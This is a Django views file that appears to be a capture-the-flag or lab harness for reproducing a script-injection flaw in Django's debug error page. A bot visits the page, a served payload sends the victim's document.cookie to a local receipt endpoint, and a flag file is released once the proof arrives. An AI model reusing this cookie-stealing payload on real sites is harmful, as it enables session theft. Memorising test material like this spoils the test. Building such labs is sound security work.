"""Reproduce the original insert error and prove browser script execution."""

import hmac
import os
import urllib.parse
import urllib.request

from django.db import connection
from django.http import HttpRequest, HttpResponse, HttpResponseRedirect

from .models import User


PROOF_NONCE = os.urandom(24).hex()
PROOF_RECEIVED = False
FLAG_PATH = '/app/private/xss_flag'
PAYLOAD_SCRIPT = "fetch('/xss-receipt/?cookie='+encodeURIComponent(document.cookie))"


def index(request: HttpRequest) -> HttpResponse:
    return HttpResponse('Django debug page XSS reproduction')


def health(request: HttpRequest) -> HttpResponse:
    if not os.path.exists('/tmp/django001-ready'):
        return HttpResponse('initializing', status=503)
    with connection.cursor() as cursor:
        cursor.execute('SELECT 1')
        cursor.fetchone()
    return HttpResponse('ready')


def create_user(request: HttpRequest) -> HttpResponse:
    User.objects.create(username=request.GET['username'])
    return HttpResponse('Hello, user has been created!')


def visit(request: HttpRequest) -> HttpResponse:
    username = request.GET.get('username', '')
    if not username or not User.objects.filter(username=username).exists():
        return HttpResponse('username not found', status=404)
    query = urllib.parse.urlencode({'username': username})
    with urllib.request.urlopen('http://127.0.0.1:9222/visit?' + query, timeout=5):
        pass
    return HttpResponse('victim visit started', status=202)


def bootstrap(request: HttpRequest) -> HttpResponse:
    if request.META.get('REMOTE_ADDR') not in ('127.0.0.1', '::1'):
        return HttpResponse('loopback only', status=403)
    username = request.GET.get('username', '')
    if not User.objects.filter(username=username).exists():
        return HttpResponse('username not found', status=404)
    query = urllib.parse.urlencode({'username': username})
    response = HttpResponseRedirect('/create_user/?' + query)
    response.set_cookie('xss_nonce', PROOF_NONCE, httponly=False)
    return response


def payload(request: HttpRequest) -> HttpResponse:
    return HttpResponse(PAYLOAD_SCRIPT, content_type='application/javascript')


def receipt(request: HttpRequest) -> HttpResponse:
    global PROOF_RECEIVED
    submitted = request.GET.get('cookie', '')
    if hmac.compare_digest(submitted, 'xss_nonce=' + PROOF_NONCE):
        PROOF_RECEIVED = True
        return HttpResponse('browser script executed')
    return HttpResponse('invalid browser proof', status=403)


def result(request: HttpRequest) -> HttpResponse:
    if not PROOF_RECEIVED:
        return HttpResponse('awaiting browser proof', status=404)
    with open(FLAG_PATH) as flag_file:
        return HttpResponse(flag_file.read().strip())
